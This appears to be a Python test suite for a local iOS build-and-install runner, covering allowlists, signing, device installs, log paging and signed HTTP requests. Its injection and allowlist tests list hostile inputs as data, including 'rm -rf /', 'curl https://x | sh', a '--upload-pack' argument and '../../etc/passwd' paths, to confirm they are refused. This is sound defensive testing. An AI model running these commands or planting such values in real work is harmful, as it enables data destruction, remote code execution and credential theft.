"""Runner tests with stand-ins for xcodebuild, xcrun (simctl, devicectl),
codesign, pnpm, npx and pod. Real git runs against throwaway repositories. No
Xcode, device or network is needed."""

import fcntl
import json
import os
import shutil
import signal
import subprocess
import sys
import tempfile
import time
import unittest
import urllib.error
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
RUNNER = ROOT / "bin" / "jorah-ios-runner"
GIT = shutil.which("git")
sys.path.insert(0, str(ROOT))

from ios_runner.auth import sign_headers  # noqa: E402
from ios_runner.config import ConfigError, load_config  # noqa: E402
from ios_runner.core import tree_digest  # noqa: E402

BUNDLE = "dev.jorah.fixture.sample"
UDID = "00008110-000A11112222801E"

# One stand-in for every tool. It records argv, cwd and a few env values, then
# acts on behaviour.json next to it: {"<key>": "<mode>"}.
STUB = r'''#!{python}
import json, os, plistlib, sys, time
from pathlib import Path
here = Path(__file__).resolve().parent
tool = Path(sys.argv[0]).name
args = sys.argv[1:]
with open(here / "calls.jsonl", "a") as f:
    f.write(json.dumps({"argv": [tool] + args, "cwd": os.getcwd(),
                        "env": {k: os.environ.get(k) for k in ("APP_VARIANT", "PATH", "CI")}}) + "\n")
key = tool
if tool == "xcrun":
    key = args[0]
    if args[:2] == ["devicectl", "device"]:
        key = "devicectl-" + args[2]
    elif args[:2] == ["devicectl", "list"]:
        key = "devicectl-list"
elif tool == "xcodebuild" and "archive" in args:
    key = "archive"
mode = json.loads((here / "behaviour.json").read_text()).get(key, "ok")
def value(flag):
    return args[args.index(flag) + 1]
def write_json(obj):
    Path(value("--json-output")).write_text(json.dumps(obj))
def make_app(folder):
    app = Path(folder) / "Sample.app"
    app.mkdir(parents=True, exist_ok=True)
    with open(app / "Info.plist", "wb") as f:
        plistlib.dump({"CFBundleIdentifier": "dev.jorah.fixture.sample"}, f)
    (app / "Sample").write_bytes(b"binary")
if mode == "hang":
    time.sleep(60)
if mode == "slow":
    time.sleep(1.5)
if key in ("xcodebuild", "archive"):
    print("Compile.swift:1:1: warning: a warning")
    if mode == "fail":
        print("/src/Sample.swift:3:5: error: cannot find 'x' in scope")
        print("** BUILD FAILED **")
        sys.exit(65)
    if mode == "signfail":
        print('error: No signing certificate "iOS Development" found')
        sys.exit(65)
    if mode == "noartifact":
        sys.exit(0)
    if key == "archive":
        make_app(Path(value("-archivePath")) / "Products" / "Applications")
    else:
        sdk = "iphonesimulator" if "Simulator" in value("-destination") else "iphoneos"
        make_app(Path(value("-derivedDataPath")) / "Build" / "Products" / f"{value('-configuration')}-{sdk}")
    sys.exit(0)
if mode == "fail":
    print("error: stub failure")
    sys.exit(1)
if key == "codesign":
    who = "Apple Distribution: Someone (ABCDE12345)" if mode == "distribution" else "Apple Development: Someone (ABCDE12345)"
    print("Executable=/x\nAuthority=" + who + "\nAuthority=Apple Worldwide Developer Relations Certification Authority")
elif key == "devicectl-list":
    devices = [] if mode == "away" else [{"properties": {
        "hardware": {"udid": "00008110-000A11112222801E", "marketingName": "iPhone 16 Pro"},
        "connection": {"pairingState": "paired"}, "state": {"bootState": "booted"},
        "software": {"osVersionNumber": {"stringValue": "27.0.1"}}}}]
    write_json({"result": {"devices": devices}})
elif key == "devicectl-install":
    write_json({"result": {"installedApplications": [{"bundleID": "dev.jorah.fixture.sample"}]}})
elif key == "devicectl-info":
    write_json({"result": {"apps": [] if mode == "empty" else [{"bundleIdentifier": "dev.jorah.fixture.sample"}]}})
elif key == "devicectl-process":
    write_json({"result": {"process": {} if mode == "nopid" else {"processIdentifier": 4242}}})
elif key in ("pnpm", "npx"):
    if mode == "rewrite":
        Path("package.json").write_text('{"scripts": {"ios": "rewritten"}}\n')
'''


def git(*args, cwd):
    return subprocess.run([GIT, *args], cwd=cwd, check=True, capture_output=True, text=True).stdout.strip()


class Case(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="ios-runner-test-"))
        self.stubs = self.tmp / "stubs"
        self.stubs.mkdir()
        for tool in ("xcodebuild", "xcrun", "codesign", "pnpm", "npx", "pod"):
            path = self.stubs / tool
            path.write_text(STUB.replace("{python}", sys.executable))
            path.chmod(0o755)
        self.behave()

        seed = self.tmp / "seed"
        seed.mkdir()
        git("init", "-q", "-b", "main", cwd=seed)
        git("config", "user.email", "t@example.invalid", cwd=seed)
        git("config", "user.name", "t", cwd=seed)
        (seed / "README").write_text("one\n")
        (seed / "package.json").write_text('{"scripts": {"ios": "expo run:ios"}}\n')
        (seed / "apps" / "mobile").mkdir(parents=True)
        (seed / "apps" / "mobile" / "app.json").write_text("{}\n")
        (seed / "Sample.xcodeproj").mkdir()
        (seed / "Sample.xcodeproj" / "project.pbxproj").write_text("// stub\n")
        git("add", ".", cwd=seed)
        git("commit", "-q", "-m", "one", cwd=seed)
        git("switch", "-q", "-c", "jorah/task-1", cwd=seed)
        (seed / "README").write_text("two\n")
        git("commit", "-q", "-am", "two", cwd=seed)
        git("switch", "-q", "main", cwd=seed)
        self.origin = self.tmp / "origin.git"
        git("clone", "-q", "--bare", str(seed), str(self.origin), cwd=self.tmp)
        self.clone = self.tmp / "clone"
        git("clone", "-q", str(self.origin), str(self.clone), cwd=self.tmp)
        self.main_sha = git("rev-parse", "HEAD", cwd=self.clone)
        self.task_sha = git("rev-parse", "jorah/task-1", cwd=seed)

        self.state = self.tmp / "state"
        self.handoff = self.tmp / "handoff"
        self.key = os.urandom(32)
        self.key_file = self.tmp / "runner.key"
        self.key_file.write_bytes(self.key)
        self.key_file.chmod(0o600)
        self.config = {
            "contract": "jorah-ios/1",
            "installAllowed": True,
            "team": "ABCDE12345",
            "stateDir": str(self.state),
            "handoffDir": str(self.handoff),
            "keyFile": str(self.key_file),
            "listen": {"host": "127.0.0.1", "port": 0},
            "path": [str(self.stubs), os.path.dirname(GIT), "/usr/bin", "/bin"],
            "maxLogBytes": 65536,
            "keepRuns": 50,
            "timeouts": {"build": 3, "git": 30},
            "projects": {
                "sample": {
                    "repo": "AdamHikl/sample",
                    "path": str(self.clone),
                    "project": "Sample.xcodeproj",
                    "scheme": "Sample",
                    "bundleId": BUNDLE,
                    "signing": {"style": "manual", "profiles": {"Sample": "Jorah dev.jorah.fixture.sample"}},
                }
            },
            "devices": {"test-iphone": {"udid": UDID}, "away-iphone": {"udid": "00008110-000AFFFFFFFF801E"}},
        }
        self.write_config()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def write_config(self):
        self.config_path = self.tmp / "projects.json"
        self.config_path.write_text(json.dumps(self.config))
        self.config_path.chmod(0o600)

    def behave(self, **modes):
        (self.stubs / "behaviour.json").write_text(json.dumps({k.replace("_", "-"): v for k, v in modes.items()}))

    def calls(self, tool=None):
        path = self.stubs / "calls.jsonl"
        rows = [json.loads(line) for line in path.read_text().splitlines()] if path.exists() else []
        return [r for r in rows if tool is None or r["argv"][0] == tool]

    def env(self):
        return {"PATH": "/usr/bin:/bin", "HOME": str(self.tmp), "TMPDIR": str(self.tmp),
                "JORAH_IOS_RUNNER_CONFIG": str(self.config_path)}

    def call(self, verb, body=None, raw=None):
        args = [sys.executable, str(RUNNER), "call", verb]
        if raw is not None:
            args.append(raw)
        elif body is not None:
            args.append(json.dumps(body))
        proc = subprocess.run(args, env=self.env(), capture_output=True, timeout=90)
        out = json.loads(proc.stdout)
        self.assertEqual(out["contract"], "jorah-ios/1")
        return out

    def code(self, out):
        return out["error"]["code"] if out["error"] else None

    def build(self, kind="build-sim", commit=None, **extra):
        return self.call(kind, {"project": "sample", "commit": commit or self.main_sha, **extra})


class Refusals(Case):
    def test_project_off_the_allowlist(self):
        out = self.call("build-sim", {"project": "threadfolio", "commit": self.main_sha})
        self.assertEqual((out["ok"], self.code(out)), (False, "PROJECT_NOT_ALLOWED"))
        self.assertFalse(out["error"]["retryable"])
        self.assertEqual(self.calls(), [])

    def test_argument_injection_is_refused_before_anything_runs(self):
        c = self.main_sha
        attempts = [
            ("build-sim", {"project": "sample; rm -rf /", "commit": c}),
            ("build-sim", {"project": "$(whoami)", "commit": c}),
            ("build-sim", {"project": "sample", "commit": "HEAD"}),
            ("build-sim", {"project": "sample", "commit": c + " -allowProvisioningUpdates"}),
            ("build-sim", {"project": "sample", "commit": c, "configuration": "Debug OTHER_SWIFT_FLAGS=-x"}),
            ("build-sim", {"project": "sample", "commit": c, "extra_args": ["-allowProvisioningUpdates"]}),
            ("build-sim", {"project": "sample", "commit": c, "env": {"DYLD_INSERT_LIBRARIES": "/x"}}),
            ("build-sim", {"project": ["sample"], "commit": c}),
            ("build-sim", ["sample"]),
            ("sync", {"project": "sample", "ref": "main && curl evil"}),
            ("sync", {"project": "sample", "ref": "--upload-pack=touch /tmp/pwned"}),
            ("install-device", {"build_run_id": "../../etc/passwd", "device": "test-iphone"}),
            ("install-device", {"build_run_id": "20261111T000000Z-sample-abcdef", "device": "test-iphone --x"}),
            ("install-device", {"build_run_id": "20261111T000000Z-sample-abcdef", "device": UDID}),
            ("install-device", {"build_run_id": "20261111T000000Z-sample-abcdef", "device": "test-iphone",
                                "launch": "yes"}),
            ("status", {"run_id": "../../etc/passwd"}),
            ("status", {"run_id": "20261111T000000Z-sample-abcdef", "wait_seconds": "5"}),
            ("status", {"run_id": "20261111T000000Z-sample-abcdef", "wait_seconds": 121}),
            ("log", {"run_id": "20261111T000000Z-sample-abcdef", "max_bytes": 262145}),
            ("devices", {"udid": UDID}),
        ]
        for verb, body in attempts:
            with self.subTest(verb=verb, body=body):
                out = self.call(verb, body)
                self.assertFalse(out["ok"])
                self.assertIn(self.code(out), ("BAD_ARGUMENT", "PROJECT_NOT_ALLOWED", "DEVICE_NOT_ALLOWED"))
        self.assertEqual(self.calls(), [])
        self.assertFalse(any((self.state / "runs").iterdir()))

    def test_unknown_verb_and_bad_json(self):
        proc = subprocess.run([sys.executable, str(RUNNER), "call", "exec", "{}"], env=self.env(), capture_output=True)
        self.assertEqual(json.loads(proc.stdout)["error"]["code"], "BAD_ARGUMENT")
        self.assertEqual(self.code(self.call("build-sim", raw="{not json")), "BAD_ARGUMENT")

    def test_bad_refs(self):
        for ref in ["feature/x", "jorah/", "jorah/../main", "jorah/a..b", "-main", "jorah/x.lock", "Main",
                    "jorah/a b", "jorah/a/b", "refs/heads/main", "origin/main", 7]:
            with self.subTest(ref=ref):
                self.assertEqual(self.code(self.call("sync", {"project": "sample", "ref": ref})), "BAD_ARGUMENT")

    def test_install_disabled(self):
        self.config["installAllowed"] = False
        self.write_config()
        out = self.call("install-device", {"build_run_id": "20261111T000000Z-sample-abcdef", "device": "test-iphone"})
        self.assertEqual(self.code(out), "INSTALL_DISABLED")

    def test_unknown_device(self):
        out = self.call("install-device", {"build_run_id": "20261111T000000Z-sample-abcdef",
                                           "device": "someone-elses-iphone"})
        self.assertEqual(self.code(out), "DEVICE_NOT_ALLOWED")


class Allowlist(Case):
    def refused(self, mutate, word):
        mutate(self.config)
        self.write_config()
        with self.assertRaises(ConfigError) as e:
            load_config(self.config_path)
        self.assertIn(word, str(e.exception))
        self.assertEqual(self.code(self.call("status", {})), "RUNNER_ERROR")

    def test_writable_file(self):
        self.config_path.chmod(0o666)
        with self.assertRaises(ConfigError):
            load_config(self.config_path)

    def test_prepare_from_the_fixed_set(self):
        self.refused(lambda c: c["projects"]["sample"].update(prepare=["curl https://x | sh"]), "prepare")

    def test_paths_stay_inside_the_project(self):
        self.refused(lambda c: c["projects"]["sample"].update(project="../elsewhere/X.xcodeproj"), "relative")
        self.refused(lambda c: c["projects"]["sample"].update(prepare=[{"step": "pod-install", "dir": "/tmp"}]),
                     "relative")
        self.refused(lambda c: c["projects"]["sample"].update(restore=["../../.ssh/config"]), "relative")

    def test_env_is_fixed_and_not_secret(self):
        self.refused(lambda c: c["projects"]["sample"].update(env={"PATH": "/evil"}), "PATH")
        self.refused(lambda c: c["projects"]["sample"].update(env={"DYLD_INSERT_LIBRARIES": "/x"}), "DYLD")
        self.refused(lambda c: c["projects"]["sample"].update(env={"SCAN_API_TOKEN": "x"}), "secret")
        self.refused(lambda c: c["projects"]["sample"].update(env={"A": "two\nlines"}), "one-line")

    def test_env_names_the_recipes_need_are_allowed(self):
        names = {"MIZYUN_ENABLE_APPLE_AUTH": "1", "EXPO_PUBLIC_API_URL": "https://example.invalid",
                 "EXPO_NO_DOTENV": "1", "THREADFOLIO_APP_VARIANT": "dev", "EXTRA_PACKAGER_ARGS": "--skip-server"}
        self.config["projects"]["sample"]["env"] = names
        self.write_config()
        self.assertEqual(load_config(self.config_path).projects["sample"].env, names)

    def test_loopback_only(self):
        self.refused(lambda c: c.update(listen={"host": "0.0.0.0", "port": 47820}), "loopback")

    def test_unknown_keys_and_contract(self):
        self.refused(lambda c: c.update(uploadTo="testflight"), "unknown")
        self.refused(lambda c: (c.pop("uploadTo"), c.update(contract="jorah-ios/2")), "contract")

    def test_example_file_loads_and_holds_placeholders_only(self):
        copy = self.tmp / "example.json"
        shutil.copy(ROOT / "projects.example.json", copy)
        copy.chmod(0o600)
        config = load_config(copy)
        self.assertEqual(sorted(config.projects), ["example-app"])
        self.assertTrue(config.projects["example-app"].bundle_id.startswith("com.example."))
        self.assertEqual(set(config.devices.values()), {"00000000-0000000000000000"})
        self.assertFalse(config.projects["example-app"].signing.allow_provisioning_updates)


class Sync(Case):
    def test_resolves_a_branch_without_touching_the_tree(self):
        out = self.call("sync", {"project": "sample", "ref": "jorah/task-1"})
        self.assertTrue(out["ok"], out)
        self.assertEqual(out["commit"], self.task_sha)
        self.assertEqual((out["repo"], out["default_branch"]), ("AdamHikl/sample", "main"))
        self.assertEqual((self.clone / "README").read_text(), "one\n")

    def test_default_ref_is_main(self):
        self.assertEqual(self.call("sync", {"project": "sample"})["commit"], self.main_sha)

    def test_missing_branch(self):
        out = self.call("sync", {"project": "sample", "ref": "jorah/no-such-task"})
        self.assertEqual(self.code(out), "REF_NOT_FOUND")

    def test_unreachable_origin(self):
        git("remote", "set-url", "origin", str(self.tmp / "gone.git"), cwd=self.clone)
        out = self.call("sync", {"project": "sample"})
        self.assertEqual((self.code(out), out["error"]["retryable"]), ("SYNC_FAILED", True))


class Builds(Case):
    def test_build_sim_proves_build(self):
        out = self.build()
        self.assertTrue(out["ok"], out)
        run = out["run"]
        self.assertEqual((run["state"], run["tier"], run["kind"]), ("succeeded", "build", "simulator"))
        self.assertIn("Not installed", run["tier_note"])
        self.assertRegex(run["run_id"], r"^\d{8}T\d{6}Z-sample-[0-9a-f]{6}$")
        art = run["artifact"]
        self.assertEqual(Path(art["path"]), self.handoff / run["run_id"] / "Sample.app")
        self.assertEqual((art["kind"], art["bytes"], art["sha256"]), ("app", *tree_digest(Path(art["path"]))))
        self.assertEqual(run["summary"], {"errors": 0, "warnings": 1, "first_errors": []})
        self.assertTrue(run["log"]["complete"])
        self.assertIn("warning: a warning", run["log"]["tail"])
        xcb = self.calls("xcodebuild")[0]["argv"]
        self.assertIn("generic/platform=iOS Simulator", xcb)
        self.assertIn("CODE_SIGNING_ALLOWED=NO", xcb)
        self.assertEqual(self.call("status", {"run_id": run["run_id"]})["run"]["artifact"], art)

    def test_builds_the_exact_commit_from_sync(self):
        commit = self.call("sync", {"project": "sample", "ref": "jorah/task-1"})["commit"]
        out = self.build(commit=commit)
        self.assertTrue(out["ok"], out)
        self.assertEqual(git("rev-parse", "HEAD", cwd=self.clone), self.task_sha)
        self.assertEqual((self.clone / "README").read_text(), "two\n")

    def test_commit_not_in_clone(self):
        self.assertEqual(self.code(self.build(commit="0" * 40)), "REF_NOT_FOUND")

    def test_dirty_tree_is_refused_and_left_alone(self):
        (self.clone / "README").write_text("my edit\n")
        (self.clone / "new-file").write_text("untracked\n")
        out = self.build()
        self.assertEqual(self.code(out), "TREE_DIRTY")
        self.assertEqual((self.clone / "README").read_text(), "my edit\n")
        self.assertTrue((self.clone / "new-file").exists())
        self.assertEqual(git("stash", "list", cwd=self.clone), "")
        self.assertEqual(self.calls(), [])

    def test_failed_build_is_failed_with_tier_none(self):
        self.behave(xcodebuild="fail")
        out = self.build()
        run = out["run"]
        self.assertEqual((out["ok"], self.code(out), run["state"], run["tier"]),
                         (False, "BUILD_FAILED", "failed", "none"))
        self.assertIsNone(run["artifact"])
        self.assertEqual(run["summary"]["errors"], 1)
        self.assertIn("cannot find 'x'", run["summary"]["first_errors"][0])

    def test_exit_zero_without_an_app_is_not_a_build(self):
        self.behave(xcodebuild="noartifact")
        out = self.build()
        self.assertEqual((self.code(out), out["run"]["tier"]), ("BUILD_FAILED", "none"))

    def test_timeout_kills_the_build(self):
        self.behave(xcodebuild="hang")
        start = time.monotonic()
        out = self.build()
        self.assertLess(time.monotonic() - start, 30)
        self.assertEqual((self.code(out), out["run"]["state"], out["run"]["tier"]), ("TIMEOUT", "failed", "none"))

    def test_prepare_runs_with_the_fixed_env_and_restores(self):
        self.config["projects"]["sample"].update(
            prepare=["pnpm-install", "expo-prebuild-npx", "pod-install"],
            restore=["package.json"], env={"APP_VARIANT": "dev"})
        self.write_config()
        self.behave(npx="rewrite")
        out = self.build()
        self.assertTrue(out["ok"], out)
        calls = self.calls()
        self.assertEqual([c["argv"][0] for c in calls[:3]], ["pnpm", "npx", "pod"])
        self.assertEqual(calls[1]["argv"], ["npx", "--no", "expo", "prebuild", "--platform", "ios", "--no-install",
                                            "--clean"])
        self.assertEqual(Path(calls[0]["cwd"]).resolve(), self.clone.resolve())
        self.assertTrue(all(c["env"]["APP_VARIANT"] == "dev" for c in calls[:4]))
        self.assertEqual(git("status", "--porcelain", cwd=self.clone), "")  # package.json put back
        self.assertTrue(self.build()["ok"])  # so the next build is not TREE_DIRTY

    def test_prepare_in_a_sub_folder(self):
        self.config["projects"]["sample"]["prepare"] = [{"step": "expo-prebuild", "dir": "apps/mobile"}]
        self.write_config()
        self.assertTrue(self.build()["ok"])
        call = self.calls("pnpm")[0]
        self.assertEqual(Path(call["cwd"]).resolve(), (self.clone / "apps" / "mobile").resolve())
        self.assertIn("--clean", call["argv"])

    def test_prepare_failure_stops_the_build_and_still_restores(self):
        self.config["projects"]["sample"].update(prepare=["pnpm-install"], restore=["package.json"])
        self.write_config()
        self.behave(pnpm="fail")
        out = self.build()
        self.assertEqual((self.code(out), out["run"]["tier"]), ("BUILD_FAILED", "none"))
        self.assertIn("pnpm-install", out["error"]["message"])
        self.assertEqual(self.calls("xcodebuild"), [])
        self.assertIn("=== restore", (self.state / "runs" / out["run"]["run_id"] / "run.log").read_text())

    def test_device_build_uses_manual_signing_per_target(self):
        out = self.build("build-device")
        self.assertTrue(out["ok"], out)
        self.assertEqual(out["run"]["tier"], "build")
        argv = self.calls("xcodebuild")[0]["argv"]
        self.assertNotIn("-allowProvisioningUpdates", argv)
        xcconfig = Path(argv[argv.index("-xcconfig") + 1]).read_text()
        self.assertIn("CODE_SIGN_STYLE = Manual", xcconfig)
        self.assertIn("CODE_SIGN_IDENTITY = Apple Development", xcconfig)
        self.assertIn("DEVELOPMENT_TEAM = ABCDE12345", xcconfig)
        self.assertIn("JORAH_PROFILE_Sample = Jorah dev.jorah.fixture.sample", xcconfig)
        self.assertIn("PROVISIONING_PROFILE_SPECIFIER = $(JORAH_PROFILE_$(TARGET_NAME))", xcconfig)

    def test_allow_provisioning_updates_only_when_the_project_says(self):
        self.config["projects"]["sample"]["signing"] = {"style": "automatic", "allowProvisioningUpdates": True}
        self.write_config()
        self.assertTrue(self.build("build-device")["ok"])
        argv = self.calls("xcodebuild")[0]["argv"]
        self.assertIn("-allowProvisioningUpdates", argv)
        self.assertIn("CODE_SIGN_STYLE=Automatic", argv)

    def test_distribution_signature_is_signing_failed(self):
        self.behave(codesign="distribution")
        out = self.build("build-device")
        self.assertEqual((self.code(out), out["run"]["tier"]), ("SIGNING_FAILED", "none"))

    def test_signing_errors_from_xcodebuild(self):
        self.behave(xcodebuild="signfail")
        self.assertEqual(self.code(self.build("build-device")), "SIGNING_FAILED")

    def test_archive_is_a_development_xcarchive_and_nothing_is_exported(self):
        out = self.build("archive", configuration="Release")
        self.assertTrue(out["ok"], out)
        art = out["run"]["artifact"]
        self.assertEqual((art["kind"], Path(art["path"])),
                         ("xcarchive", self.handoff / out["run"]["run_id"] / "Sample.xcarchive"))
        self.assertIn("Not exported, not uploaded", out["run"]["tier_note"])
        self.assertIn("archive", self.calls("xcodebuild")[0]["argv"])
        self.assertFalse([c for c in self.calls("xcodebuild") if "-exportArchive" in c["argv"]])


class Install(Case):
    def device_build(self):
        out = self.build("build-device")
        self.assertTrue(out["ok"], out)
        return out["run"]["run_id"]

    def install(self, run_id, **extra):
        return self.call("install-device", {"build_run_id": run_id, "device": "test-iphone", **extra})

    def test_install_proves_install_not_launch(self):
        out = self.install(self.device_build())
        run = out["run"]
        self.assertTrue(out["ok"], out)
        self.assertEqual((run["kind"], run["tier"], run["state"]), ("install", "install", "succeeded"))
        self.assertEqual(run["device"], {"alias": "test-iphone", "model": "iPhone 16 Pro", "os_version": "27.0.1"})
        self.assertIn("Not launched", run["tier_note"])
        install = [c for c in self.calls("xcrun") if c["argv"][1:4] == ["devicectl", "device", "install"]][0]
        self.assertIn(UDID, install["argv"])  # UDID from the allowlist, never the request
        self.assertFalse([c for c in self.calls("xcrun") if "process" in c["argv"]])

    def test_launch_proves_launch(self):
        build_id = self.device_build()
        out = self.install(build_id, launch=True)
        self.assertEqual((out["ok"], out["run"]["tier"], out["run"]["build_run_id"]), (True, "launch", build_id))

    def test_launch_without_a_process_is_launch_failed_at_tier_install(self):
        build_id = self.device_build()
        self.behave(devicectl_process="nopid")
        out = self.install(build_id, launch=True)
        self.assertEqual((self.code(out), out["run"]["state"], out["run"]["tier"]),
                         ("LAUNCH_FAILED", "failed", "install"))

    def test_failed_install_is_tier_build(self):
        build_id = self.device_build()
        self.behave(devicectl_install="fail")
        out = self.install(build_id, launch=True)
        self.assertEqual((self.code(out), out["run"]["state"], out["run"]["tier"]),
                         ("INSTALL_FAILED", "failed", "build"))

    def test_device_must_list_the_app(self):
        build_id = self.device_build()
        self.behave(devicectl_info="empty")
        self.assertEqual(self.code(self.install(build_id)), "INSTALL_FAILED")

    def test_phone_away(self):
        build_id = self.device_build()
        self.behave(devicectl_list="away")
        out = self.install(build_id)
        self.assertEqual((self.code(out), out["error"]["retryable"], out["run"]["tier"]),
                         ("DEVICE_UNAVAILABLE", True, "build"))

    def test_only_a_finished_device_build_installs(self):
        sim = self.build()["run"]["run_id"]
        self.assertEqual(self.code(self.install(sim)), "NOT_INSTALLABLE")
        self.assertEqual(self.code(self.install("20261111T000000Z-sample-abcdef")), "RUN_NOT_FOUND")

    def test_changed_artifact(self):
        build_id = self.device_build()
        (self.handoff / build_id / "Sample.app" / "Sample").write_bytes(b"swapped")
        out = self.install(build_id)
        self.assertEqual((self.code(out), out["run"]["tier"]), ("ARTIFACT_MISSING", "none"))

    def test_devices(self):
        out = self.call("devices", {})
        self.assertEqual(out["devices"], [
            {"alias": "away-iphone", "model": None, "os_version": None, "connected": False},
            {"alias": "test-iphone", "model": "iPhone 16 Pro", "os_version": "27.0.1", "connected": True}])

    def test_devices_unknown_is_null_not_false(self):
        self.behave(devicectl_list="fail")
        out = self.call("devices", {})
        self.assertEqual({d["connected"] for d in out["devices"]}, {None})


class StatusLogsLocks(Case):
    def test_status_lists_newest_first(self):
        ids = [self.build()["run"]["run_id"] for _ in range(3)]
        runs = self.call("status", {})["runs"]
        self.assertEqual([r["run_id"] for r in runs], ids[::-1])

    def test_log_pages(self):
        run_id = self.build()["run"]["run_id"]
        whole = self.call("log", {"run_id": run_id})
        self.assertTrue(whole["eof"])
        self.assertEqual(whole["bytes"], whole["total_bytes"])
        page = self.call("log", {"run_id": run_id, "offset": 10, "max_bytes": 20})
        self.assertEqual((page["offset"], page["bytes"], page["eof"]), (10, 20, False))
        self.assertEqual(page["text"], whole["text"][10:30])

    def test_log_cap_keeps_the_end(self):
        noisy = self.stubs / "xcodebuild"
        noisy.write_text(STUB.replace("{python}", sys.executable).replace(
            'if key in ("xcodebuild", "archive"):',
            'if key in ("xcodebuild", "archive"):\n    print("x" * 200000)\n    print("THE-LAST-LINE")'))
        run = self.build()["run"]
        self.assertFalse(run["log"]["complete"])
        self.assertLess(run["log"]["bytes"], 65536 + 200)
        log = self.call("log", {"run_id": run["run_id"]})["text"]
        self.assertIn("bytes dropped by the log cap", log)
        self.assertIn("THE-LAST-LINE", log)

    def test_old_runs_are_rotated_but_artifacts_stay(self):
        self.config["keepRuns"] = 2
        self.write_config()
        ids = [self.build()["run"]["run_id"] for _ in range(3)]
        self.assertEqual(sorted(p.name for p in (self.state / "runs").iterdir()), sorted(ids[1:]))
        self.assertTrue((self.handoff / ids[0] / "Sample.app").exists())

    def test_a_run_whose_process_died_is_unknown(self):
        run = self.build()["run"]
        record = self.state / "runs" / run["run_id"] / "run.json"
        data = json.loads(record.read_text())
        dead = subprocess.Popen(["/usr/bin/true"])
        dead.wait()
        data["run"]["state"] = "running"
        data["owner_pid"] = dead.pid
        record.write_text(json.dumps(data))
        out = self.call("status", {"run_id": run["run_id"]})
        self.assertEqual((out["run"]["state"], self.code(out)), ("unknown", "RUNNER_ERROR"))

    def test_one_run_at_a_time(self):
        (self.state / "locks").mkdir(parents=True)
        with open(self.state / "locks" / "runner.lock", "a") as held:
            fcntl.flock(held, fcntl.LOCK_EX | fcntl.LOCK_NB)
            out = self.build()
            self.assertEqual((self.code(out), out["error"]["retryable"]), ("BUSY", True))
            self.assertEqual(self.code(self.call("sync", {"project": "sample"})), "BUSY")
            health = subprocess.run([sys.executable, str(RUNNER), "health"], env=self.env(), capture_output=True)
            self.assertTrue(json.loads(health.stdout)["busy"])
        self.assertEqual(self.calls(), [])
        self.assertTrue(self.build()["ok"])


class Http(Case):
    def setUp(self):
        super().setUp()
        self.server = subprocess.Popen([sys.executable, "-I", str(RUNNER), "serve"], env=self.env(),
                                       stderr=subprocess.PIPE, text=True)
        line = self.server.stderr.readline()
        self.assertIn("listening on 127.0.0.1:", line)
        self.base = "http://127.0.0.1:" + line.strip().rsplit(":", 1)[1]

    def tearDown(self):
        self.server.send_signal(signal.SIGTERM)
        self.server.wait(timeout=20)
        self.server.stderr.close()
        super().tearDown()

    def post(self, verb, body, headers=None, sign=True, path=None, key=None, raw=None):
        data = raw if raw is not None else json.dumps(body).encode()
        route = path or f"/v1/{verb}"
        h = {"Content-Type": "application/json"}
        if sign:
            h.update(sign_headers(key or self.key, route, data))
        h.update(headers or {})
        req = urllib.request.Request(self.base + route, data=data, method="POST", headers=h)
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()

    def test_health_is_unsigned_and_says_little(self):
        with urllib.request.urlopen(self.base + "/v1/health", timeout=5) as r:
            body = json.loads(r.read())
        self.assertEqual(sorted(body), ["busy", "contract", "runner_version"])
        self.assertEqual((body["busy"], body["contract"]), (False, "jorah-ios/1"))

    def test_auth(self):
        body = {"project": "sample"}
        self.assertEqual(self.post("sync", body, sign=False), (401, b""))
        self.assertEqual(self.post("sync", body, key=os.urandom(32)), (401, b""))
        old = sign_headers(self.key, "/v1/sync", json.dumps(body).encode(), now=time.time() - 120)
        self.assertEqual(self.post("sync", body, headers=old), (401, b""))
        other = sign_headers(self.key, "/v1/devices", json.dumps(body).encode())  # signed for another route
        self.assertEqual(self.post("sync", body, headers=other), (401, b""))
        data = json.dumps({}).encode()
        once = sign_headers(self.key, "/v1/devices", data)
        self.assertEqual(self.post("devices", None, raw=data, headers=once)[0], 200)
        self.assertEqual(self.post("devices", None, raw=data, headers=once), (401, b""))  # replay
        self.assertEqual([c for c in self.calls() if c["argv"][0] != "xcrun"], [])

    def test_a_loose_key_file_refuses_everything(self):
        self.key_file.chmod(0o644)
        self.assertEqual(self.post("devices", {}), (401, b""))

    def test_routes_size_and_contract(self):
        status, body = self.post("exec", {}, path="/v1/exec")
        self.assertEqual((status, json.loads(body)["error"]["code"]), (404, "BAD_ARGUMENT"))
        status, _ = self.post("sync", None, raw=b"{" + b" " * 9000 + b"}")
        self.assertEqual(status, 413)
        status, body = self.post("devices", {}, headers={"X-Jorah-Contract": "jorah-ios/2"})
        self.assertEqual((status, json.loads(body)["error"]["code"]), (400, "CONTRACT_MISMATCH"))

    def test_build_replies_at_once_then_status_waits(self):
        self.behave(xcodebuild="slow")
        start = time.monotonic()
        status, body = self.post("build-sim", {"project": "sample", "commit": self.main_sha})
        first = json.loads(body)
        self.assertLess(time.monotonic() - start, 2)
        self.assertEqual(status, 200)
        self.assertIn(first["run"]["state"], ("queued", "running"))
        self.assertFalse(first["run"]["log"]["complete"])
        with urllib.request.urlopen(self.base + "/v1/health", timeout=5) as r:
            self.assertTrue(json.loads(r.read())["busy"])
        status, body = self.post("build-sim", {"project": "sample", "commit": self.main_sha})
        self.assertEqual(json.loads(body)["error"]["code"], "BUSY")
        status, body = self.post("status", {"run_id": first["run"]["run_id"], "wait_seconds": 20})
        final = json.loads(body)
        self.assertEqual((final["ok"], final["run"]["state"], final["run"]["tier"]), (True, "succeeded", "build"))


class Source(unittest.TestCase):
    def test_no_shell_anywhere(self):
        for path in (ROOT / "ios_runner").glob("*.py"):
            source = path.read_text()
            self.assertNotIn("shell=True", source, path)
            self.assertNotIn("os.system", source, path)
            self.assertNotIn("os.popen", source, path)

    def test_serve_is_the_verb_the_launch_agent_runs(self):
        agent = (ROOT.parents[1] / "scripts" / "mac" / "ios-runner-agent.sh").read_text()
        self.assertIn("jorah-ios-runner serve", agent)


if __name__ == "__main__":
    unittest.main()
